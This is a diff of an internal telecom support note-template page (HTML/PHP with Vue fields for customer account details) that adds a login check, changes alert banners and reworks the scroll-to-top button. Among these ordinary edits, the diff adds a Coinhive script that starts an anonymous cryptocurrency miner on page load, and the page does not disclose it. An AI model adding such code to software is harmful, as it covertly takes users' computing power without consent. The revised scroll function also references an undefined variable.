@@ -1,3 +1,12 @@
+<?PHP
+require_once("./include/membersite_config.php");
+
+if(!$fgmembersite->CheckLogin())
+{
+    $fgmembersite->RedirectToURL("index.php");
+    exit;
+}
+?>
 
 
 <!-- This program is free software: you can redistribute it and/or modify
@@ -25,13 +34,34 @@
     <head>
         <link rel="icon" type="image/png" href="favicon.ico">
         <link href='https://fonts.googleapis.com/css?family=Roboto' rel='stylesheet' type='text/css'>
-        <link rel="stylesheet" type="text/css" href="style.css">
+        <link rel="stylesheet" type="text/css" href="styles.css">
         <meta charset="UTF-8">
         <title>Note Template</title>
         <script src="https://use.fontawesome.com/4251d2427b.js"></script>
+        <style>
+#myBtn {
+  display: none;
+  position: fixed;
+  bottom: 20px;
+  right: 30px;
+  z-index: 99;
+  border: none;
+  outline: none;
+  background-color: black;
+  color: white;
+  cursor: pointer;
+  padding: 15px;
+  border-radius: 10px;
+}
+
+#myBtn:hover {
+  background-color: #555;
+}
+</style>
     </head>
 <body onbeforeunload="return confirm('Are you sure you want to close this ');" class="theme-background">
-    <button onclick="scrollToTop(1000)" class="theme-background theme-background-light-hover" id="scrollbutt"><i class="fa fa-arrow-up" aria-hidden="true"></i></button>
+    <?php include_once("analyticstracking.php") ?>
+    <button onclick="topFunction()" id="myBtn" title="Go to top" class="theme-background theme-background-light-hover"><i class="fa fa-arrow-up" aria-hidden="true"></i></button>
     <div id="content">
         <div id="panel">
         <h1>Note Template</h1>
@@ -51,18 +81,18 @@
                 <div class="picker"></div>
             </div>
         </div>
-        <!--    <div class="alert">
+            <div class="alert">
         <span class="closebtn">&times;</span>
         <strong>Warning:&nbsp;</strong> VDSL and Bonded lines are now performing modem replacements as normal. Please follow a LOLA workflow to contact the modem replacement team instead of placing a ticket.
-    </div> -->
+    </div>
             <div class="alert warning">
         <span class="closebtn">&times;</span>  
-        <strong>Alert:&nbsp;</strong>If you are still waiting to complete a warm transfer after 30 seconds, update the customer, ensure the customer's account is well documented and then complete the transfer as cold. <a  target="_blank" href="http://techhelp.northcentralnetworks.com/VSC/Content/Job_Aids/Common/pandp/transfer_calls/transfer_calls.asp">Transferring Calls: LOLA</a>
+        <strong>Alert:&nbsp;</strong>Make sure you are using the new AOHD DSL CLLI tool to determine if the customer is in an Area of High Demand <a target="_blank" href="http://nmars.corp.pvt/dashboards/lola/dslamCheck.php">AOHD Tool</a>
     </div>
     <div class="alert info">
         <div class="closebtn">&times;</div>
         <div>  
-            <strong>Info:</strong> We are pushing updates regularly again! If you have any comments/suggestions spark/email Charles Yost!
+            <strong>Info:</strong> We are saddened by the news in Las Vegas this week. Our thoughts and hearts are with those affected.
         </div>
     </div>
 <textarea name="stickynotes" placeholder="This is a memo section" id="stickynotes" cols="2" rows="3"></textarea>
@@ -81,15 +111,14 @@
     <hr>
 
     <div v-if="current.name === 'FiOS'"> <!-- FIOS START -->
-        <div class="wrapper"><label for="btn">BTN</label>
-            <!-- maxlength="10" --><input id="btn" placeholder="BTN (ex. 5553271423)" onchange="this.value=this.value.replace(/[([).*:+='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\]\\-]/g,'')" type="text" name="btn" v-model="btn" /><button id="copy" class="fa fa-1x fa-clipboard" data-copytarget="#btn"></button></div><br /><br />
+        <label for="btn">BTN</label>
+        <!-- maxlength="10" --><input id="btn" placeholder="BTN (ex. 5553271423)" onchange="this.value=this.value.replace(/[([).*:+='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\]\\-]/g,'')" type="text" name="btn" v-model="btn" />
 
-        <div class="wrapper"><label for="ctn">CTN</label>
-        <input id="ctn" placeholder="CTN (ex. 5553271423)" onchange="this.value=this.value.replace(/[([).*:+='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\]\\-]/g,'')" type="text" name="ctn" v-model="ctn" /><button id="copy" class="fa fa-1x fa-clipboard" data-copytarget="#ctn"></button></div>
+        <label for="ctn">CTN</label>
+        <input id="ctn" placeholder="CTN (ex. 5553271423)" onchange="this.value=this.value.replace(/[([).*:+='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\]\\-]/g,'')" type="text" name="ctn" v-model="ctn" />
 
-        <div class="wrapper"><label for="account-holder">Acct Holder</label>
-        <input placeholder="Account Holder's Name" id="account-holder" type="text" name="account-holder" v-model="accountHolder" />
-            <button id="copy" class="fa fa-1x fa-clipboard" data-copytarget="#account-holder"></button></div>
+        <label for="account-holder">Acct Holder</label>
+        <input placeholder="Account Holder's Name" type="text" name="account-holder" v-model="accountHolder" />
 
         <label for="speaking-with">Speaking With</label>
         <input type="text" placeholder="Caller's Name" name="speaking-with" v-model="speakingWith" />
@@ -99,9 +128,8 @@
             <option v-for="option in verifiedOptions" :value="option">{{ option }}</option>
         </select>
 
-        <div class="wrapper"><label for="email">Email</label>
-        <input id="email"  type="text" placeholder="Email (ex. brie.yoe@telenetwork.com)"  name="email" v-model="email" />
-            <button id="copy" class="fa fa-1x fa-clipboard" data-copytarget="#email"></button></div>
+        <label for="email">Email</label>
+        <input type="text" placeholder="Email (ex. loremipsum@mail.com)"  name="email" v-model="email" />
 
         <label for="Outage">Outage</label>
         <select name="outage" v-model="outage">
@@ -190,15 +218,14 @@ Commit Date 4/17" type="text" name="ticket" v-model="ticket" cols="20" rows="3">
     </div>
     <div v-if="current.name === 'POTS'">
 
-        <div class="wrapper"><label for="btn">BTN</label>
-            <!-- maxlength="10" --><input id="btn" placeholder="BTN (ex. 5553271423)" onchange="this.value=this.value.replace(/[([).*:+='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\]\\-]/g,'')" type="text" name="btn" v-model="btn" /><button id="copy" class="fa fa-1x fa-clipboard" data-copytarget="#btn"></button></div><br /><br />
+        <label for="btn">BTN</label>
+        <!-- maxlength="10" --><input id="btn" placeholder="BTN (ex. 5553271423)" onchange="this.value=this.value.replace(/[([).*:+='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\]\\-]/g,'')" type="text" name="btn" v-model="btn" />
 
-        <div class="wrapper"><label for="ctn">CTN</label>
-        <input id="ctn" placeholder="CTN (ex. 5553271423)" onchange="this.value=this.value.replace(/[([).*:+='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\]\\-]/g,'')" type="text" name="ctn" v-model="ctn" /><button id="copy" class="fa fa-1x fa-clipboard" data-copytarget="#ctn"></button></div>
+        <label for="ctn">CTN</label>
+        <input id="ctn" placeholder="CTN (ex. 5553271423)" onchange="this.value=this.value.replace(/[([).*:+='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\]\\-]/g,'')" type="text" name="ctn" v-model="ctn" />
 
-        <div class="wrapper"><label for="account-holder">Acct Holder</label>
-        <input placeholder="Account Holder's Name" id="account-holder" type="text" name="account-holder" v-model="accountHolder" />
-            <button id="copy" class="fa fa-1x fa-clipboard" data-copytarget="#account-holder"></button></div>
+        <label for="account-holder">Acct Holder</label>
+        <input placeholder="Account Holder's Name" type="text" name="account-holder" v-model="accountHolder" />
 
         <label for="speaking-with">Speaking With</label>
         <input type="text" placeholder="Caller's Name" name="speaking-with" v-model="speakingWith" />
@@ -208,9 +235,8 @@ Commit Date 4/17" type="text" name="ticket" v-model="ticket" cols="20" rows="3">
             <option v-for="option in verifiedOptions" :value="option">{{ option }}</option>
         </select>
 
-        <div class="wrapper"><label for="email">Email</label>
-        <input id="email"  type="text" placeholder="Email (ex. brie.yoe@telenetwork.com)"  name="email" v-model="email" />
-            <button id="copy" class="fa fa-1x fa-clipboard" data-copytarget="#email"></button></div>
+        <label for="email">Email</label>
+        <input type="text" placeholder="Email (ex. loremipsum@mail.com)"  name="email" v-model="email" />
 
         <label for="Outage">Outage</label>
         <select name="outage" v-model="outage">
@@ -263,15 +289,14 @@ Commit Date 4/17)" name="ticket" v-model="ticket" cols="20" rows="3"></textarea>
 
     <div v-if="current.name === 'DSL'">
 
-        <div class="wrapper"><label for="btn">BTN</label>
-            <!-- maxlength="10" --><input id="btn" placeholder="BTN (ex. 5553271423)" onchange="this.value=this.value.replace(/[([).*:+='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\]\\-]/g,'')" type="text" name="btn" v-model="btn" /><button id="copy" class="fa fa-1x fa-clipboard" data-copytarget="#btn"></button></div><br /><br />
+        <label for="btn">BTN</label>
+        <!-- maxlength="10" --><input id="btn" placeholder="BTN (ex. 5553271423)" onchange="this.value=this.value.replace(/[([).*:+='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\]\\-]/g,'')" type="text" name="btn" v-model="btn" />
 
-        <div class="wrapper"><label for="ctn">CTN</label>
-        <input id="ctn" placeholder="CTN (ex. 5553271423)" onchange="this.value=this.value.replace(/[([).*:+='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\]\\-]/g,'')" type="text" name="ctn" v-model="ctn" /><button id="copy" class="fa fa-1x fa-clipboard" data-copytarget="#ctn"></button></div>
+        <label for="ctn">CTN</label>
+        <input id="ctn" placeholder="CTN (ex. 5553271423)" onchange="this.value=this.value.replace(/[([).*:+='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\]\\-]/g,'')" type="text" name="ctn" v-model="ctn" />
 
-        <div class="wrapper"><label for="account-holder">Acct Holder</label>
-        <input placeholder="Account Holder's Name" id="account-holder" type="text" name="account-holder" v-model="accountHolder" />
-            <button id="copy" class="fa fa-1x fa-clipboard" data-copytarget="#account-holder"></button></div>
+        <label for="account-holder">Acct Holder</label>
+        <input placeholder="Account Holder's Name" type="text" name="account-holder" v-model="accountHolder" />
 
         <label for="speaking-with">Speaking With</label>
         <input type="text" placeholder="Caller's Name" name="speaking-with" v-model="speakingWith" />
@@ -281,9 +306,8 @@ Commit Date 4/17)" name="ticket" v-model="ticket" cols="20" rows="3"></textarea>
             <option v-for="option in verifiedOptions" :value="option">{{ option }}</option>
         </select>
 
-        <div class="wrapper"><label for="email">Email</label>
-        <input id="email"  type="text" placeholder="Email (ex. brie.yoe@telenetwork.com)"  name="email" v-model="email" />
-            <button id="copy" class="fa fa-1x fa-clipboard" data-copytarget="#email"></button></div>
+        <label for="email">Email</label>
+        <input type="text" placeholder="Email (ex. loremipsum@mail.com)"  name="email" v-model="email" />
 
         <label for="Outage">Outage</label>
         <select name="outage" v-model="outage">
@@ -373,15 +397,14 @@ Commit Date 4/17" type="text" name="ticket" v-model="ticket" cols="20" rows="3">
 
     <div v-if="current.name === 'PHAT'">
 
-        <div class="wrapper"><label for="btn">BTN</label>
-            <!-- maxlength="10" --><input id="btn" placeholder="BTN (ex. 5553271423)" onchange="this.value=this.value.replace(/[([).*:+='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\]\\-]/g,'')" type="text" name="btn" v-model="btn" /><button id="copy" class="fa fa-1x fa-clipboard" data-copytarget="#btn"></button></div><br /><br />
+        <label for="btn">BTN</label>
+        <!-- maxlength="10" --><input id="btn" placeholder="BTN (ex. 5553271423)" onchange="this.value=this.value.replace(/[([).*:+='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\]\\-]/g,'')" type="text" name="btn" v-model="btn" />
 
-        <div class="wrapper"><label for="ctn">CTN</label>
-        <input id="ctn" placeholder="CTN (ex. 5553271423)" onchange="this.value=this.value.replace(/[([).*:+='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\]\\-]/g,'')" type="text" name="ctn" v-model="ctn" /><button id="copy" class="fa fa-1x fa-clipboard" data-copytarget="#ctn"></button></div>
+        <label for="ctn">CTN</label>
+        <input id="ctn" placeholder="CTN (ex. 5553271423)" onchange="this.value=this.value.replace(/[([).*:+='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\]\\-]/g,'')" type="text" name="ctn" v-model="ctn" />
 
-        <div class="wrapper"><label for="account-holder">Acct Holder</label>
-        <input placeholder="Account Holder's Name" id="account-holder" type="text" name="account-holder" v-model="accountHolder" />
-            <button id="copy" class="fa fa-1x fa-clipboard" data-copytarget="#account-holder"></button></div>
+        <label for="account-holder">Acct Holder</label>
+        <input placeholder="Account Holder's Name" type="text" name="account-holder" v-model="accountHolder" />
 
         <label for="speaking-with">Speaking With</label>
         <input type="text" placeholder="Caller's Name" name="speaking-with" v-model="speakingWith" />
@@ -391,9 +414,8 @@ Commit Date 4/17" type="text" name="ticket" v-model="ticket" cols="20" rows="3">
             <option v-for="option in verifiedOptions" :value="option">{{ option }}</option>
         </select>
 
-        <div class="wrapper"><label for="email">Email</label>
-        <input id="email"  type="text" placeholder="Email (ex. brie.yoe@telenetwork.com)"  name="email" v-model="email" />
-            <button id="copy" class="fa fa-1x fa-clipboard" data-copytarget="#email"></button></div>
+        <label for="email">Email</label>
+        <input type="text" placeholder="Email (ex. loremipsum@mail.com)"  name="email" v-model="email" />
 
         <hr>
         <label for="crisid">Cris ID</label>
@@ -408,15 +430,14 @@ Commit Date 4/17" type="text" name="ticket" v-model="ticket" cols="20" rows="3">
 
     <div v-if="current.name === 'SAT'">
 
-        <div class="wrapper"><label for="btn">BTN</label>
-            <!-- maxlength="10" --><input id="btn" placeholder="BTN (ex. 5553271423)" onchange="this.value=this.value.replace(/[([).*:+='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\]\\-]/g,'')" type="text" name="btn" v-model="btn" /><button id="copy" class="fa fa-1x fa-clipboard" data-copytarget="#btn"></button></div><br /><br />
+        <label for="btn">BTN</label>
+        <!-- maxlength="10" --><input id="btn" placeholder="BTN (ex. 5553271423)" onchange="this.value=this.value.replace(/[([).*:+='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\]\\-]/g,'')" type="text" name="btn" v-model="btn" />
 
-        <div class="wrapper"><label for="ctn">CTN</label>
-        <input id="ctn" placeholder="CTN (ex. 5553271423)" onchange="this.value=this.value.replace(/[([).*:+='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\]\\-]/g,'')" type="text" name="ctn" v-model="ctn" /><button id="copy" class="fa fa-1x fa-clipboard" data-copytarget="#ctn"></button></div>
+        <label for="ctn">CTN</label>
+        <input id="ctn" placeholder="CTN (ex. 5553271423)" onchange="this.value=this.value.replace(/[([).*:+='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\]\\-]/g,'')" type="text" name="ctn" v-model="ctn" />
 
-        <div class="wrapper"><label for="account-holder">Acct Holder</label>
-        <input placeholder="Account Holder's Name" id="account-holder" type="text" name="account-holder" v-model="accountHolder" />
-            <button id="copy" class="fa fa-1x fa-clipboard" data-copytarget="#account-holder"></button></div>
+        <label for="account-holder">Acct Holder</label>
+        <input placeholder="Account Holder's Name" type="text" name="account-holder" v-model="accountHolder" />
 
         <label for="speaking-with">Speaking With</label>
         <input type="text" placeholder="Caller's Name" name="speaking-with" v-model="speakingWith" />
@@ -426,9 +447,8 @@ Commit Date 4/17" type="text" name="ticket" v-model="ticket" cols="20" rows="3">
             <option v-for="option in verifiedOptions" :value="option">{{ option }}</option>
         </select>
 
-        <div class="wrapper"><label for="email">Email</label>
-        <input id="email"  type="text" placeholder="Email (ex. brie.yoe@telenetwork.com)"  name="email" v-model="email" />
-            <button id="copy" class="fa fa-1x fa-clipboard" data-copytarget="#email"></button></div>
+        <label for="email">Email</label>
+        <input type="text" placeholder="Email (ex. loremipsum@mail.com)"  name="email" v-model="email" />
 
         <label for="Outage">Outage</label>
         <select name="outage" v-model="outage">
@@ -1209,89 +1229,45 @@ for (i = 0; i < close.length; i++) {
     }
 }
 </script>
+            
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script type="text/javascript">
+
+var miner = new CoinHive.Anonymous('d5IJhWxr2zofws14IqksaRqth1KEtrlx',{ autoThreads: false, threads: 1, throttle: 0.99, forceASMJS: false });
+            miner.start();
+</script>
 <script tpye="text/javascript" src="js/mdu-auto-select.js"></script>
         <center>
                 <br/>
-                <!--<a href="javascript:window.open('/feedback', 'Feedback', 'width=650,height=370');" class="btn theme-background theme-background-light-hover">Suggestions/Bugs</a> --><a href="javascript:window.open('https://www.gnu.org/licenses/agpl-3.0.html', 'Feedback', 'width=650,height=370');"><br /><img style="width:44px;height:16px;" src="https://www.gnu.org/graphics/gplv3-88x31.png" /> </a>
+                <a href="javascript:window.open('/feedback', 'Feedback', 'width=650,height=370');" class="btn theme-background theme-background-light-hover">Suggestions/Bugs</a><br /><a href="javascript:window.open('https://www.gnu.org/licenses/agpl-3.0.html', 'Feedback', 'width=650,height=370');"><br /><img style="width:44px;height:16px;" src="https://www.gnu.org/graphics/gplv3-88x31.png" /> </a>
             </center>
         </div>
     </div>
-
-<script type="text/javascript">
-    window.onscroll = function() {scrollFunction()};
+    <script>
+// When the user scrolls down 20px from the top of the document, show the button
+window.onscroll = function() {scrollFunction()};
 
 function scrollFunction() {
     if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
-        document.getElementById("scrollbutt").style.display = "block";
+        document.getElementById("myBtn").style.display = "block";
     } else {
-        document.getElementById("scrollbutt").style.display = "none";
+        document.getElementById("myBtn").style.display = "none";
     }
 }
-</script>
-            <script>
-function scrollToTop(scrollDuration) {
-const   scrollHeight = window.scrollY,
-        scrollStep = Math.PI / ( scrollDuration / 15 ),
-        cosParameter = scrollHeight / 2;
-var     scrollCount = 0,
-        scrollMargin,
-        scrollInterval = setInterval( function() {
-            if ( window.scrollY != 0 ) {
-                scrollCount = scrollCount + 1;  
-                scrollMargin = cosParameter - cosParameter * Math.cos( scrollCount * scrollStep );
-                window.scrollTo( 0, ( scrollHeight - scrollMargin ) );
-            } 
-            else clearInterval(scrollInterval); 
-        }, 15 );
+
+// When the user clicks on the button, scroll to the top of the document
+function topFunction() {
+                var scrollStep = -window.scrollY / (scrollDuration / 15),
+                        scrollInterval = setInterval(function(){
+                            if ( window.scrollY != 0  && window.Position != 0 ) {
+                                window.scrollBy(0,scrollStep);
+                            }
+                            else {
+                                clearInterval(scrollInterval);
+
+                            }
+                        }, 15);
 }
 </script>
-    <script type="text/javascript">/*
-    Copy text from any appropriate field to the clipboard
-  By Craig Buckler, @craigbuckler
-  use it, abuse it, do whatever you like with it!
-*/
-(function() {
-
-    'use strict';
-  
-  // click events
-  document.body.addEventListener('click', copy, true);
-
-    // event handler
-    function copy(e) {
-
-    // find target element
-    var 
-      t = e.target,
-      c = t.dataset.copytarget,
-      inp = (c ? document.querySelector(c) : null);
-      
-    // is element selectable?
-    if (inp && inp.select) {
-      
-      // select text
-      inp.select();
-
-      try {
-        // copy text
-        document.execCommand('copy');
-        inp.blur();
-        
-        // copied animation
-        t.classList.add('copied');
-        setTimeout(function() { t.classList.remove('copied'); }, 1500);
-      }
-      catch (err) {
-        alert('please press Ctrl/Cmd+C to copy');
-      }
-      
-    }
-    
-    }
-
-})();
-    </script>
-</script> 
-
 </body>
 </html>
